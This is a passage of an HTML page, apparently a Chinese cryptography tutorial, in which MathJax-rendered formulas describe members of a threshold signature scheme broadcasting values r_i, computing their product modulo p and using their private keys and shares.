144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1092.7, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mo" transform="translate(2037.5, 0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2315.5, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2815.5, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3260.2, 0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(3942.4, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(4942.6, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5442.6, 0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container>，计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="13.867ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 6129.3 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(451, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1022.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2078.5, 0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="TeXAtom" transform="translate(477, 363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(3459.5, 0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833, 0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333, 0)"></path></g><g data-mml-node="mi" transform="translate(5626.3, 0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>并将其广播给所有成员。</p>
<p>收到其他成员广播的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.685ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 745 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(451, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>后，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.118ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 936 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>计算</p>
<script type="math/tex; mode=display">r=\prod_{i=1}^tr_i\bmod p</script><p>通过自己的私钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 759 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mi" transform="translate(465, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.844ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 815 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>、份额<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="28.141ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 12438.4 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mi" transform="translate(490, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(831.3, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1220.3, 0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2086.3, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2475.3, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2864.3, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(3554.1, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(4609.8, 0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(5193.1, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(6193.3, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6693.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(7137.9, 0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(7721.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(8721.4, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(9221.4, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(9666.1, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(11004.7, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(11449.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12049.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 